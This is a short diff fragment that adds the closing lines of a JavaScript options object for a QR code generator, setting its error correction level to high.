+correctLevel: QRCode.CorrectLevel.H
+});
+ 
